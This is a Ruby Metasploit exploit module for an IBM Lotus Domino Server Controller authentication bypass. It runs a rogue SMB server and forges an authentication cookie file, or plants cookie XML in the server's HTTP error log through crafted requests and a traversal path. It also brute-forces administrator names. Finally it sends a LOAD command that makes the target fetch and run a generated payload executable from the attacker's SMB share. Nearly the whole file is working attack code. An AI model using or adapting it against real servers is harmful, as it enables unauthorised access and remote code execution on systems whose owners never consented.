
require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
    
        include Msf::Exploit::Remote::Tcp
        include Msf::Exploit::Remote::SMBServer

# The SMB header template
SMB_HDR2 = Rex::Struct2::CStructTemplate.new(
	[ 'uint32n', 'Magic',             0xff534d42 ],
	[ 'uint8',   'Command',           0 ],
	[ 'uint32v', 'ErrorClass',        0 ],
	[ 'uint8',   'Flags1',            0 ],
	[ 'uint16v', 'Flags2',            0 ],
	[ 'uint16v', 'ProcessIDHigh',     0 ],
	[ 'uint32v', 'Signature1',        0 ],
	[ 'uint32v', 'Signature2',        0 ],
	[ 'uint16v', 'Reserved1',         0 ],
	[ 'uint16v', 'TreeID',            0 ],
	[ 'uint16v', 'ProcessID',         0 ],
	[ 'uint16v', 'UserID',            0 ],
	[ 'uint16v', 'MultiplexID',       0 ]
)
       
# A basic SMB template to read all responses
SMB_BASE2_HDR_PKT = Rex::Struct2::CStructTemplate.new(
	[ 'template', 'SMB',                 SMB_HDR2 ],
	[ 'uint16v', 'ByteCount',            0 ],
	[ 'string',  'Payload', nil,        '' ]
).create_restraints(
	[ 'Payload', 'ByteCount',  nil, true ]
)
SMB_BASE2_PKT = CONST::make_nbs(SMB_BASE2_HDR_PKT)

# A SMB template for SMB Tree Connect requests with extented Response
SMB_TREE_CONN_EXT_RES_HDR_PKT = Rex::Struct2::CStructTemplate.new(
	[ 'template', 'SMB',                 CONST::SMB_HDR ],
	[ 'uint8',   'AndX',                 0 ],
	[ 'uint8',   'Reserved1',            0 ],
	[ 'uint16v', 'AndXOffset',           0 ],
	[ 'uint16v', 'OptionalSupport',      0 ],
        ['uint32v','MaximalShareAccessRights',0],
        [ 'uint32v','GuestMaximalShareAccessRights', 0 ],
	[ 'uint16v', 'ByteCount',            0 ],
	[ 'string',  'Payload', nil,        '' ]
).create_restraints(
	[ 'Payload', 'ByteCount',  nil, true ]
)
SMB_TREE_CONN_EXT_RES_PKT = CONST::make_nbs(SMB_TREE_CONN_EXT_RES_HDR_PKT)

SMB_QUERY_FILE_BASIC_INFO = Rex::Struct2::CStructTemplate.new(
                                                      [ 'uint64v', 'CreationTime', 0],
                                                      [ 'uint64v', 'LastAccessTime', 0],
                                                      [ 'uint64v', 'LastWriteTime', 0],
                                                      [ 'uint64v', 'LastChangeTime', 0],
                                                      [ 'uint32v', 'FileAttr', 20],
                                                      [ 'uint32v', 'Reserved',0]
                                                              )

SMB_QUERY_FILE_NETWORK_OPEN_INFO = Rex::Struct2::CStructTemplate.new(
                                                      [ 'uint64v', 'CreationTime', 0],
                                                      [ 'uint64v', 'LastAccessTime', 0],
                                                      [ 'uint64v', 'LastWriteTime', 0],
                                                      [ 'uint64v', 'LastChangeTime', 0],
                                                      ['uint64v','AllocationSize', 0],
                                                      ['uint64v','EndOfFile',0],
                                                      [ 'uint32v', 'FileAttr', 20],
                                                      [ 'uint32v', 'Reserved',0]
                                                                     )

SMB_QUERY_FILE_STANDART_INFO = Rex::Struct2::CStructTemplate.new(
                                                               ['uint64v','AllocationSize', 0],
                                                                ['uint64v','EndOfFile',0],
                                                                ['uint32v','NumberOfLinks',1],
                                                                ['uint8','DeletePending',0],
                                                                ['uint8','Directory',0]
                                                              )

SMB_FIND_FILE_BOTH_DIRECTORY_INFO = Rex::Struct2::CStructTemplate.new(
                                                                     ['uint16v','Padding',0],
                                                                     ['uint32v','NextEntryOffset',0],
                                                                     ['uint32v','FileIndex',0],
                                                                     [ 'uint64v', 'CreationTime', 0],
                                                                     [ 'uint64v', 'LastAccessTime', 0],
                                                                     [ 'uint64v', 'LastWriteTime', 0],
                                                                     [ 'uint64v', 'LastChangeTime', 0],
                                                                      ['uint64v','EndOfFile',0],
                                                                     ['uint64v','AllocationSize', 0],
                                                                     [ 'uint32v', 'FileAttr', 0x20],
                                                                     [ 'uint32v','FileNameLen',0],
                                                                     [ 'uint32v','EAListLength',0],
                                                                     [ 'uint8','ShortFileNameLen',0],
                                                                     [ 'uint8', 'Reserved',0],
                                                                      ['string','ShortFileName',nil,''],
                                                                      [ 'string','FileName',nil,'']
                                                                     )                                                      
                                                         
	def connect(global = true, opts={})
#                require 'debug'
		dossl = true
          #          require 'debug'
		nsock = Rex::Socket::Tcp.create(
			'PeerHost'  =>  datastore['RHOST'],
			'PeerPort'  => (datastore['RPORT']).to_i,
			'LocalHost' =>  datastore['CHOST'] || "0.0.0.0",
			'LocalPort' => (datastore['CPORT'] || 0).to_i,
			'SSL'       =>  dossl,
			'SSLVersion'=>  datastore['SSLVersion'],
                                                'SSLKey' => datastore['SSLKey'],
                                                'SSLCert' => datastore['SSLCert'],
			'Timeout'   => (datastore['ConnectTimeout'] || 10).to_i,
			'Context'   =>
				{
					'Msf'        => framework,
					'MsfExploit' => self,
				})

		# enable evasions on this socket
		set_tcp_evasions(nsock)

		# Set this socket to the global socket as necessary
		self.sock = nsock if (global)

		# Add this socket to the list of sockets created by this exploit
		add_socket(nsock)

		return nsock
	end


      def initialize
           super(
               'Name'          => 'IBM Lotus Domino Server Controller Authentication Bypass',
               'Description'   => 'This module sends a payload',
               'Author'        => 'Alexnadr Minozhenko',
               'Payload'       => {},
               'Targets'       => [ ['Automatic', {} ] ],
               'Platform'      => 'win'
           )
           register_options( [
               Opt::RPORT(2050),
               OptInt.new('HTTPPORT',[false, 'Port of http server',47001]),
               OptString.new('HTTPLOGPATH',[false, 'Path to log on the server',"..\\..\\..\\..\\..\\windows\\system32\\logfiles\\httperr\\httperr1"]),
               OptPath.new('SSLCert',    [ false, 'Path to a custom SSL certificate (default is randomly generated)']),
               OptPath.new('SSLKey',    [ false, 'Path to a custom SSL private ']),
               OptEnum.new('Method',[false,'Method using for exploitation','cookiefile',['cookiefile','logfile']])
           ], self.class)
        @count_buf = 0
        @files = {}


      end


        def get_allocsize(size)
            clust_size = 4096
            if size <= 1024
              return 1024
            else
              num = size / clust_size
              c = size % clust_size
              if c==0
                return num* clust_size
              else
                return (num+1) * clust_size
              end
            end
        end
                          
      	def smb_cmd_negotiate(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_NEG_PKT.make_struct
		pkt.from_s(buff)

		# Record the remote process ID
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']


		dialects = pkt['Payload'].v['Payload'].gsub(/\x00/, '').split(/\x02/).grep(/^\w+/)


		dialect =
                        dialects.index("NT LM 0.12") ||
                        dialects.length-1
                
           
		pkt = CONST::SMB_NEG_RES_NT_PKT.make_struct
		smb_set_defaults(c, pkt)

 		time_hi, time_lo = UTILS.time_unix_to_smb(Time.now.to_i)

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NEGOTIATE
		pkt['Payload']['SMB'].v['Flags1'] = 0x98
		pkt['Payload']['SMB'].v['Flags2'] = 0xc853
		pkt['Payload']['SMB'].v['WordCount'] = 17
		pkt['Payload'].v['Dialect'] = dialect
		pkt['Payload'].v['SecurityMode'] = 3
		pkt['Payload'].v['MaxMPX'] = 2
		pkt['Payload'].v['MaxVCS'] = 1
		pkt['Payload'].v['MaxBuff'] = 4356
 		pkt['Payload'].v['MaxRaw'] = 65536
		pkt['Payload'].v['Capabilities'] = 0x8000e3fd # 0x80000000 for extended
		pkt['Payload'].v['ServerTime'] = time_lo
		pkt['Payload'].v['ServerDate'] = time_hi
		pkt['Payload'].v['Timezone']   = 0x0


		pkt['Payload'].v['SessionKey'] = 0
		pkt['Payload'].v['KeyLength'] = 8
          
          pkt['Payload'].v['Payload'] = "\x00"*16
          #pkt['Payload'].v['Payload'] = "\x6b\x34\xe2\x9f\x60\x74\x18\x4a\x97\xe2\x03\xe7\xd7\xc5\xe7\xa8"
     
            c.put(pkt.to_s)
	end
        
        def smb_cmd_session_setup(c, buff)
          smb = @state[c]
          pkt = CONST::SMB_SETUP_NTLMV1_PKT.make_struct
          pkt.from_s(buff)
          
          smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
          smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
          smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
          smb[:user_id] =  pkt['Payload']['SMB'].v['UserID']


	
          
          pkt = CONST::SMB_SETUP_RES_PKT.make_struct


          pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
          pkt['Payload']['SMB'].v['ProcessID'] = smb[:process_id].to_i
          pkt['Payload']['SMB'].v['UserID'] = rand(0xffff)
          pkt['Payload']['SMB'].v['MultiplexID'] = smb[:multiplex_id].to_i
          pkt['Payload'].v['WordCount']=4
          
          pkt['Payload'].v['AndX'] = 0xff
          data = "\x00\x00"*2
          pkt['Payload'].v['ByteCount'] = data.length
          pkt['Payload'].v['Payload'] = data
          pkt['Payload']['SMB'].v['Flags1']  = 0x98
          pkt['Payload']['SMB'].v['Flags2']  = 0xc807

          c.put(pkt.to_s)
          print_status("Send SESSION_SETUP response") #debug
          

	end
        
	def smb_cmd_tree_connect_andx(c, buff)
          smb = @state[c]
          pkt = CONST::SMB_TREE_CONN_PKT.make_struct
          pkt.from_s(buff)
          #print_status(pkt['Payload'])
          #print_status(pkt['Payload'].v)
          smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
          smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
          smb[:user_id] =  pkt['Payload']['SMB'].v['UserID']
          path = pkt['Payload'].v['Payload']['Path']
          service = pkt['Payload'].v['Payload']['Service']
          payload = pkt['Payload'].v['Payload']
          print_status("Path:#{path} Service:#{service}")
          print_status("Payload: #{payload}")
          print_status("ProcessId: #{smb[:process_id]}")  
          print_status("UserId: #{smb[:user_id]}")
          print_status("TreeId: #{smb[:tree_id]}")
          

          pkt = SMB_TREE_CONN_EXT_RES_PKT.make_struct
          #pkt['Payload'].v['Payload'] = data
          smb_set_defaults(c,pkt)
          smb[:tree_id] = rand(0xffff)
          pkt['Payload']['SMB'].v['TreeID'] = smb[:tree_id]
          pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TREE_CONNECT_ANDX
          pkt['Payload'].v['AndX'] = 0xff
          pkt['Payload']['SMB'].v['Flags1']  = 0x98
          pkt['Payload']['SMB'].v['Flags2']  = 0xc807
          pkt['Payload']['SMB'].v['WordCount'] = 0x07
          pkt['Payload'].v['MaximalShareAccessRights'] = 0x001301bf
          

          
          pkt['Payload'].v['Payload']  = "A:\x00"+ Rex::Text.to_unicode("NTFS")+"\x00\x00"



          c.put(pkt.to_s)
          print_status("Send TREE_CONN response")
          
        end

        #def smb_cmd_open
        def smb_cmd_nt_create(c, buff)
          smb = @state[c]
          pkt = CONST::SMB_CREATE_PKT.make_struct
          pkt.from_s(buff)
          smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
          
          smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
          smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
          smb[:user_id] =  pkt['Payload']['SMB'].v['UserID']
        
          
#          smbpayload = "\\" + pkt['Payload'].v['Payload'].split("\x00\x00").map { |x| x.gsub(/\x00/, '') }[0]
 #         print_status("Payload: #{smbpayload}")
          print_status("Payload2: #{pkt['Payload'].v['Payload'].to_s}")
          smbpayload = pkt['Payload'].v['Payload'].to_s[1..-1].split("\x00").join()
          print_status("Payload: #{smbpayload}")

          pkt = CONST::SMB_CREATE_RES_PKT.make_struct
          pkt.from_s(buff)
          smb_set_defaults(c,pkt)
          pkt['Payload']['SMB'].v['Flags1']  = 0x98
          pkt['Payload']['SMB'].v['Flags2']  = 0xc807
          pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_CREATE_ANDX
          #pkt['Payload'].v['FileID'] = 0x4000

          if not @files.include?smbpayload
            pkt['Payload']['SMB'].v['ErrorClass'] = 0xc0000034
            pkt['Payload'].v['FileID'] = 0
            c.put(pkt.to_s)
            return
          end
          
                @fileid = @fileid+1
          pkt['Payload'].v['Action'] = 1
          pkt['Payload'].v['FileID'] = @fileid

          pkt['Payload'].v['IPCState'] = 0x0007
          pkt['Payload'].v['OpLock'] = 0x02
          pkt['Payload']['SMB'].v['WordCount'] = 42
          pkt['Payload'].v['Attributes'] = 0x00000020
          pkt['Payload'].v['AllocHigh'] = 0
          pkt['Payload'].v['AllocLow'] = get_allocsize(@files[smbpayload].length) #TODO: make on variable
          pkt['Payload'].v['EOFLow'] = @files[smbpayload].length
          pkt['Payload'].v['EOFHigh'] = 0 
          pkt['Payload'].v['FileType'] = 0x0000
          pkt['Payload'].v['IsDirectory'] = 0
          pkt['Payload'].v['Payload'] = ''

          @files[@fileid] = smbpayload
          
          c.put(pkt.to_s)
          print_status("Send NT_CREATE response")
         
        end
                
        def set_time(info_struct)
          time= UTILS.time_unix_to_smb(Time.now.to_i).collect{ |x| x.to_s 16 }.reverse.join.to_i 16
          
          print_status("Time: #{time.inspect}")
          info_struct.v['LastAccessTime'] = time
          info_struct.v['CreationTime'] = time
          info_struct.v['LastWriteTime'] =time
          info_struct.v['LastChangeTime'] = time
          return info_struct
        end

        def smb_trans2(c,buff)
     
          smb = @state[c]
          pkt =  CONST::SMB_TRANS2_PKT.make_struct          
          pkt.from_s(buff)

          smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
          smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
          smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
          smb[:user_id] =  pkt['Payload']['SMB'].v['UserID']


          filename = (pkt['Payload'].to_s[74..-1]).delete("\x00")

          print_status("Filename: #{filename.inspect}")


          subcommand = pkt['Payload'].v['SetupData'].unpack('v')
          p=pkt['Payload'].to_s[-8..-1]
          print_status("Payload: #{p}")
          level = p.unpack('vA')[0]
          
          print_status("Payload len: #{p.length}")
          print_status("Information level: #{level}")
          print_status("Subcommand: #{subcommand}")

          respkt = CONST::SMB_TRANS_RES_PKT.make_struct
          smb_set_defaults(c,respkt)
          
          respkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
          respkt['Payload']['SMB'].v['Flags1']  = 0x98
          respkt['Payload']['SMB'].v['Flags2']  = 0xc807
          
          

          if (subcommand[0]  == CONST::TRANS2_QUERY_PATH_INFO)
            print_status("Get QUERY_PATH_INFO  Request ")
            
            
            rpayload = pkt['Payload'].to_s
            print_status("ByteCount: #{pkt['Payload']['ByteCount'].to_s}")

            print_status( "Payload: #{rpayload.inspect} Payloadlen: #{rpayload.to_s.length}")
            info = SMB_QUERY_FILE_BASIC_INFO.make_struct
            

            info_level = rpayload.to_s.split("\x00\x00\x00\x00")[-3].unpack('s')[0]
            if (info_level == 0) # FIX: make one chek
                q=rpayload.to_s.split("\x00") 
                print_status("Payload split: #{q}")
                info_level = rpayload.to_s.split("\x00")[-1].unpack('s')[0]
            end
            print_status("Info level: #{info_level}")
            
            info = set_time(info)
 
            if @files.include?filename
              allocsize = get_allocsize(@files[filename].length)
              endoffile  = @files[filename].length
            else
               respkt['Payload']['SMB'].v['ErrorClass'] = 0xc0000034
              respkt['Payload']['SMB'].v['WordCount'] = 0
              respkt['Payload'].v['ByteCount'] = 0
              c.put(respkt.to_s)
              return 
            end
            fileattr = 20
           
            respkt['Payload']['SMB'].v['WordCount'] = 10
            respkt['Payload'].v['ParamCountTotal'] = 2
            respkt['Payload'].v['ParamCount' ] = 2
            respkt['Payload'].v['ParamOffset'] = 56 

            if (info_level == 1004)
       
              respkt['Payload'].v['DataCountTotal'] = 40
              respkt['Payload'].v['ByteCount'] = 45 
              respkt['Payload'].v['DataCount'] = 40
              respkt['Payload'].v['DataOffset'] = 60
              info.v['FileAttr']=0x10
              
              respkt['Payload'].v['Payload'] = "\x00" *5 + info.to_s 

            c.put(respkt.to_s)
              
            elsif (info_level == 1005)
                           
              respkt['Payload'].v['ParamCountTotal'] = 2
              respkt['Payload'].v['ParamCount' ] = 2
              respkt['Payload'].v['DataOffset'] = 60
              respkt['Payload'].v['ParamOffset'] = 56
              info = SMB_QUERY_FILE_STANDART_INFO.make_struct
              isdir = 0 
              print_status("FileName2 #{filename.inspect}")
              if (filename == "")
                print_status("Check 1")
                allocsize = 0
                endoffile = 0 
                isdir = 1
              end
              info.v['AllocationSize'] = allocsize
              info.v['EndOfFile'] = endoffile
              p=[allocsize , endoffile , 1,0,isdir,0].pack('QQLCCS')
              print_status("Payload length: #{p.length}")
              respkt['Payload'].v['DataCount'] = p.length
              p2 = "\x00" * 5 +  p 
              respkt['Payload'].v['Payload'] = p2
              respkt['Payload'].v['ByteCount'] =  p2.length
              respkt['Payload'].v['DataCountTotal'] = p.length
              
              c.put(respkt.to_s)
              
            elsif (info_level == 1034)

              info = SMB_QUERY_FILE_NETWORK_OPEN_INFO.make_struct
              info = set_time(info)
              info.v['AllocationSize'] = get_allocsize(@cookiefile.length)
              info.v['EndOfFile'] = @cookiefile.length
              respkt['Payload'].v['DataOffset'] = 60
              respkt['Payload'].v['DataCount'] = 56
              respkt['Payload'].v['DataCountTotal'] = 56
              p = "\x00" * 5 + info.to_s
              respkt['Payload'].v['Payload'] = p
              respkt['Payload'].v['ByteCount'] =  p.length

              c.put(respkt.to_s)

            end
            
            elsif (subcommand[0] == CONST::TRANS2_QUERY_FILE_INFO)
            print_status("Get QUERY_FILE_INFO  Request ")
            
            respkt['Payload'].v['DataCount' ] =8
            respkt['Payload'].v['DataOffset'] = 60
            respkt['Payload'].v['ParamCount'] =2 
            respkt['Payload'].v['ParamCountTotal'] =2 
            respkt['Payload'].v['ParamOffset'] = 56
            respkt['Payload'].v['DataCountTotal' ] =8
            respkt['Payload']['SMB'].v['WordCount' ] =10
            
            p = [0,0,0x000100000000456e].pack('CLQ')
            respkt['Payload'].v['Payload'] = p
            respkt['Payload'].v['ByteCount'] = p.length
            
            c.put(respkt.to_s)
            
            
          elsif (subcommand[0] == CONST::TRANS2_FIND_FIRST2)
            print_status('Get FIND_FIRST request')
            pkt_data   = pkt.to_s[-43..-1]
            level = pkt_data.delete("\x00").unpack('SSSS')[2]
            #print_status("Bytes count #{bytes}")
            print_status("Pkt_data #{pkt_data}") 
            print_status("Level of Interest #{level}")
            filename = (pkt['Payload'].to_s[76..-1]).delete("\x00")
            print_status("Search Pattern: #{filename}")
           # allocsize = get_allocsize(@files["\\npayload.exe"].length)
            #endoffile  = @files["\\npayload.exe"].length
            filename = "" if filename == "\\*"
            print_status("Search Pattern2: #{filename}")
            allocsize = get_allocsize(@files[filename].length)
            endoffile  = @files[filename].length
            fileattr = 0x20
            respkt['Payload'].v['DataCountTotal'] =   124
            respkt['Payload'].v['DataCount'] =   124
            respkt['Payload'].v['DataOffset'] = 68
            respkt['Payload'].v['ParamCount'] = 10 
            respkt['Payload'].v['ParamCountTotal'] = 10
            respkt['Payload'].v['ParamOffset'] = 56
            respkt['Payload']['SMB'].v['WordCount'] = 10

            parametrs = [0x0800,1,1,0,0].pack('SSSSS')
            filename = filename[1..-1].split("").collect{ |x| x+"\x00"}.join() unless filename == ""
            file_len = filename.length
            
            if level == 260
              data = SMB_FIND_FILE_BOTH_DIRECTORY_INFO.make_struct
              data = set_time(data)
              data.v['EndOfFile'] = endoffile
              data.v['AllocationSize'] =  allocsize
              data.v['FileNameLen'] = file_len
              data.v['FileName'] = filename
              data.v['ShortFileName'] = "\x00"*file_len
              data.v['FileAttr'] = fileattr

               print_status("Data struct: #{data.to_s}")
              p = "\x00"+parametrs + data.to_s + "\x00"*6
            elsif level == 259
              respkt['Payload'].v['DataCountTotal'] =   36
              respkt['Payload'].v['DataCount'] =   36
              data= [0,0,file_len,filename].pack('LLLA*')
              p = "\x00"+parametrs+"\x00\x00" +data
            else
              print_status("Unknown Level")
            end
            respkt['Payload'].v['Payload'] = p
            respkt['Payload'].v['ByteCount'] = p.length
            c.put(respkt.to_s)

          else
            print_status( "SetupData: #{subcommand}")
          end

          
        end
          

        def smb_read(c, buff)
          smb = @state[c]
          
          pkt =  CONST::SMB_READ_PKT.make_struct          
          pkt.from_s(buff)
          
          smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
          smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
          smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
          smb[:user_id] =  pkt['Payload']['SMB'].v['UserID']
          fileid = pkt['Payload'].v['FileID'].to_i
          num_bytes = pkt['Payload'].v['MaxCountLow'].to_i
          offset = pkt['Payload'].v['Offset'].to_i
          
          pkt = CONST::SMB_READ_RES_PKT.make_struct
          smb_set_defaults(c,pkt)
          pkt['Payload']['SMB'].v['Flags1'] = 0x98 
          pkt['Payload']['SMB'].v['Flags2'] = 0xe807
          pkt['Payload']['SMB'].v['WordCount'] = 12


          name = @files[fileid]
          @file = @files[name][offset..offset+num_bytes-1]
                

          print_status("Sending Payload #{@file.length}")
          pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_READ_ANDX
          pkt['Payload'].v['AndX'] = 0xff
          pkt['Payload'].v['DataLenLow'] = @file.length
          pkt['Payload'].v['DataOffset'] = 60
          pkt['Payload'].v['Remaining']= 0xffff
          pkt['Payload'].v['AnxOffset'] =0
          pkt['Payload'].v['DataCompaction'] =0
          pkt['Payload'].v['Reserverd1'] =0
          pkt['Payload'].v['DataLenHigh'] =0
          pkt['Payload'].v['Reserverd2'] = 0
          pkt['Payload'].v['Reserverd3'] = 0
          pkt['Payload'].v['Reserverd4'] = 0
          
#          if pkt.to_s.length % 2 !=0
          if num_bytes < 30000
            pkt['Payload'].v['Payload'] = "\x00"+@file
          else
            pkt['Payload'].v['Payload'] = @file
          end
          c.put(pkt.to_s)
          print_status("Send READ response")
         
        end

        def smb_close(c, buff)
          smb = @state[c]
          pkt = CONST::SMB_CLOSE_PKT.make_struct
          
          pkt.from_s(buff)
          
          smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
          smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
          smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
          smb[:user_id] =  pkt['Payload']['SMB'].v['UserID']
          
          pkt  = CONST::SMB_CLOSE_RES_PKT.make_struct
          smb_set_defaults(c,pkt)
          pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_CLOSE
          pkt['Payload']['SMB'].v['Flags1']  = 0x98
          pkt['Payload']['SMB'].v['Flags2']  = 0xc807

          c.put(pkt.to_s)
        end
        
        def smb_tree_disconnect(c, buff)
          smb = @state[c]
          pkt = CONST::SMB_TREE_DISCONN_PKT.make_struct
          
          pkt.from_s(buff)
          
          smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
          smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
          smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
          smb[:user_id] =  pkt['Payload']['SMB'].v['UserID']
          
          pkt  = CONST::SMB_TREE_DISCONN_RES_PKT.make_struct
          smb_set_defaults(c,pkt)
          pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TREE_DISCONNECT
          pkt['Payload']['SMB'].v['Flags1']  = 0x98
          pkt['Payload']['SMB'].v['Flags2']  = 0xc807

          c.put(pkt.to_s)
        end

        def smb_nt_transact(c ,buff)
          smb = @state[c]
          pkt = CONST::SMB_NTTRANS_PKT.make_struct
          
          pkt.from_s(buff)
          
          smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
          smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
          smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
          smb[:user_id] =  pkt['Payload']['SMB'].v['UserID']
#          filename = pkt['Payload'].v['Payload'].to_s[0..-1].split("\x00").join()
 #         print_status("Filename requested: #{filename}")
          pkt  = CONST::SMB_NTTRANS_RES_PKT.make_struct
          smb_set_defaults(c,pkt)
          pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_TRANSACT
          pkt['Payload']['SMB'].v['Flags1']  = 0x98
          pkt['Payload']['SMB'].v['Flags2']  = 0xc807


          pkt['Payload']['SMB'].v['WordCount'] = 18
          pkt['Payload'].v['DataCountTotal'] =   20
          pkt['Payload'].v['DataCount'] =   20
          pkt['Payload'].v['DataOffset'] = 76
          pkt['Payload'].v['ParamCount'] = 4
          pkt['Payload'].v['ParamCountTotal'] = 4
          pkt['Payload'].v['ParamOffset'] = 72
          data = [1,0x8000,0,0,0,0].pack('SSLLLL')
          param = [data.length].pack('L')
          p = "\x00"+param+data
          pkt['Payload'].v['Payload'] = p
          pkt['Payload'].v['ByteCount'] =p.length

          c.put(pkt.to_s)
        end
          
	def smb_cmd_dispatch(cmd, c, buff)
          smb = @state[c]
		print_status("Received command #{cmd} from #{smb[:name]}")
		
		case cmd
		when CONST::SMB_COM_NEGOTIATE
			smb_cmd_negotiate(c, buff)

		when CONST::SMB_COM_SESSION_SETUP_ANDX
			smb_cmd_session_setup(c, buff)

		when CONST::SMB_COM_TREE_CONNECT_ANDX
			smb_cmd_tree_connect_andx(c, buff)
                  
                when CONST::SMB_COM_NT_CREATE_ANDX
                  smb_cmd_nt_create(c, buff)
                  
                 when CONST::SMB_COM_TRANSACTION2  
                   smb_trans2(c, buff)
                when  CONST::SMB_COM_READ_ANDX
                  smb_read(c, buff)

                when CONST::SMB_COM_CLOSE
                  smb_close(c, buff)
                 
                when CONST::SMB_COM_TREE_DISCONNECT
                    smb_tree_disconnect(c, buff)
               
                when CONST::SMB_COM_NT_TRANSACT
                  smb_nt_transact(c, buff)

		else
			print_status("Ignoring request from #{smb[:name]} (#{cmd})")
			pkt = CONST::SMB_BASE_PKT.make_struct
			pkt['Payload']['SMB'].v['Command'] = cmd
			pkt['Payload']['SMB'].v['Flags1']  = 0x88
			pkt['Payload']['SMB'].v['Flags2']  = 0xc001
			pkt['Payload']['SMB'].v['ErrorClass'] = 0 # 0xc0000022
			c.put(pkt.to_s)
		end
	end
      # Connect to port, send the payload, handle it, disconnect
        def httpport
          datastore['HTTPPORT']
        end

        def httplogpath
          datastore['HTTPLOGPATH']
        end

        def send_http_request(req,opts={})
                
                
                http_sock = Rex::Socket::Tcp.create(
                                                    'PeerHost'  =>  opts['RHOST'] || rhost,
                                                    'PeerPort'  => (opts['HTTPPORT'] || httpport).to_i,
                                                    'LocalHost' =>  opts['CHOST'] || chost || "0.0.0.0",
                                                    'LocalPort' => (opts['CPORT'] || cport || 0).to_i,
                                                    ##			'SSL'       =>  dossl,
                                                    #			'SSLVersion'=>  opts['SSLVersion'] || ssl_version,
                                                    'Proxies'   => proxies,
                                                    'Timeout'   => (opts['ConnectTimeout'] || connect_timeout || 10).to_i,
                                                    'Context'   =>
                                                    {
                                                            'Msf'        => framework,
                                                            'MsfExploit' => self,
                                                    })

                http_sock.put(req)
                print_status("Sending request #{req}")
                http_sock.shutdown
                http_sock.close

        end
        
      def brut_user
              begin_value = 'adminis'
              print_status("Brutforce users with began value: #{begin_value}")
              connect
              for prefix in 'a'..'z'
                      username = prefix + begin_value
                      sock.put("#UI #{username},pass\n")
                      res = sock.get_once
                      print_status("Res: #{res}")
                      if (res =~ /WRONG_PASSWORD/)
                              disconnect()
                              print_status("Find valid user #{username}")
                              return username
                      elsif (res =~ /NOT_REG_ADMIN/)
                              next
                      end
              end
              
              print_status("Does not find valid user ")
              disconnect()
              
              return nil
      end
      def gener_payload
              print_status("Generate payload")
              $framework = Msf::Simple::Framework.create(
                                                         :module_types => [ Msf::MODULE_PAYLOAD, Msf::MODULE_NOP ],
                                                         'DisableDatabase' => true)

              payload = $framework.payloads.create(datastore['PAYLOAD'])
              arch = payload.arch
              plat = payload.platform.platforms
              enc = datastore['ENCODER']
              buf = payload.generate_simple(
                                            'Format'    => 'raw',
                                            'Options'   => datastore,
                                            'Encoder'   => enc)

              exe  = Msf::Util::EXE.to_executable_fmt($framework, arch, plat, buf,'exe-small',{})
              @files['\\npayload.exe'] = exe
      end
      def authorization(path,user='admin',password='pass')
              #
              # Authentificatinog in Lotus Domino Controller
              #

              print_status("Authorization")
              connect

              sock.put("#API\n")
              sock.put("#APPLET\n")
              sock.put("#COOKIEFILE #{path}\n")
              #print_status("#COOKIEFILE #{path}\n")
              sock.put("#USERADDRESS home\n")
              print_status('test')
              sock.put("#UI #{user},#{password}\n")
              res=sock.get_once

              print_status("Received: #{res}")

              if (res =~ /WRONG_PASSWORD/)
                      print_status("Wrong password")
              elsif (res =~ /VALID_USER/) 
                      print_status("Valid user")
                      gener_payload
                      sock.put("#EXIT\n")
                      print_status("LOAD \\\\" << datastore['CHOST'] << "\\public\\payload.exe\n")
                      sock.put("LOAD \\\\" << datastore['CHOST'] << "\\public\\payload.exe\n")
                      
                      return true
              elsif (res =~  /NOT_REG_ADMIN/  and (datastore['Method'] =~ /cookiefile|logfile/ ))
                      user = brut_user()
                      return authorization(path,user,password) unless user.nil?                                           
              disconnect()
              return false
              end
      end


       
      def exploit 
        
              @fileid = 0x4000
              method = datastore['Method'].downcase
              print_status("Method #{method}")
              user = 'aadminis'
              password = "pass"
        start_service()
              if method == 'cookiefile'

                      print_status("SMBServer started.")
        
                      print_status("Create COOKIEFILE")
                      @cookiefile = "   <user name=\"#{user}\" cookie=\"#{password}\" address=\"home\">\x0d\x0a"
        
                      @files['\\cookiefile.xml'] = @cookiefile
                # @files["\\"]=""
                @files[""]=""

                      
                      path2cookie = "\\\\" << datastore['CHOST'] << "\\public\\cookiefile.xml"

              elsif (method == 'logfile')

                      @files['\\']=""
                      print_status("SMBServer started.")
                      print_status("Sending http request")
                      send_http_request("GET <user HTTP/1.0\r\n\r\n")
                      send_http_request("GET name=\"#{user}\"cookie=\"#{password}\"address=\"home\"> HTTP/1.0\r\n\r\n")
                      path2cookie = httplogpath
                      print_status("Wait")
                      select(nil, nil, nil, 30)
              end

              authorization(path2cookie,user,password) 
              self.service.wait        
      end
         
